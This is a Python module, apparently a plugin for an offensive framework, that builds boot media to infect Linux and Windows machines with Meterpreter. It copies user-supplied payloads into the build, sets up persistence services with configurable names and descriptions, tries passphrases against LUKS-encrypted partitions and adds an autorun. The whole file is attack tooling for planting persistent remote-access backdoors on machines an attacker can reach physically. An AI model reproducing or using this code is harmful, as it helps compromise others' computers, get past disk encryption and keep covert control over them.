"""
Infect with Meterpreter. Note that it uses Metasploit itself.
"""
import random
import string
import os

from snr.core.payload.payload import Context, Payload
from snr.core.util import common_utils, programs


class CustomPayload(Payload):
    AUTHORS = ("GlobularOne",)
    TARGET_OS_LIST = ("GNU/Linux", "Microsoft Windows")
    INPUTS = (
        ("LINUX_PAYLOAD", "", -1, "Payload to use for Linux"),
        ("LINUX_SERVICE_NAME", "", -1,
         "Name of the persistance service for Linux", True),
        ("LINUX_SERVICE_DESCRIPTION", "", -1,
         "Description of the persistance service for Linux", True),
        ("WINDOWS_PAYLOAD", "", -1, "Payload ot use for Windows"),
        ("WINDOWS_SERVICE_NAME", "", -1,
         "Name of the persistance service for Windows", True),
        ("PASSPHRASES", [], -1, "Passphrases to try for LUKS-encrypted partitions"),
    )


    def generate(self, ctx: Context) -> int:
        variables = self.get_self_variables()
        assert isinstance(variables["WINDOWS_PAYLOAD"], str)
        assert isinstance(variables["LINUX_PAYLOAD"], str)
        for payload_name, platform in ((variables["WINDOWS_PAYLOAD"], "windows"), (variables["LINUX_PAYLOAD"], "linux")):
            ctx.mkdir("root/data")
            if not os.path.isabs(payload_name):
                payload_name = os.path.abspath(payload_name)
            ctx.copy(payload_name, f"data/{platform}")
        self.format_payload_and_write(ctx, variables)
        self.add_autorun(ctx)
        return 0


payload = CustomPayload()
